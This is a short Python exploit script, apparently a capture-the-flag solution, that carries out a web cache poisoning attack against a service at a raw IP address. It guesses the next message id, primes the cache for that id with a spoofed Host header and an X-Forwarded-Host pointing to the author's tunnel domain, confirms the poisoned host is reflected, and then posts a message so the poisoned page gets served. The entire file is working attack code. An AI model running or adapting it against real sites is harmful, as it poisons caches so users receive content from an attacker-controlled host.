import requests
import random
import re

my_vps = "41151f93c6dd17.lhr.life"
base_url = "http://134.209.17.55:32196"

def get_current_id():
    url = f"{base_url}/message/{random.randint(1000, 10000)}"
    r = requests.get(url)
    return r.json().get("count")

def make_cache(id_):
    url = f"{base_url}/letters?id={id_}"
    headers = {
        "host": "127.0.0.1",
        "X-Forwarded-Host": my_vps
    }
    r = requests.get(url, headers=headers)
    if re.search(headers.get("X-Forwarded-Host"), r.text):
        print(f"[*] make {id_} cache success")

def hack():
    current_id = get_current_id()
    next_id = current_id + 1
    print(f"next_id: {next_id}")
    make_cache(next_id)
    print("[*] start")
    url = f"{base_url}/submit"
    data = {
        "message": "1"
    }
    requests.post(url, json=data)


hack()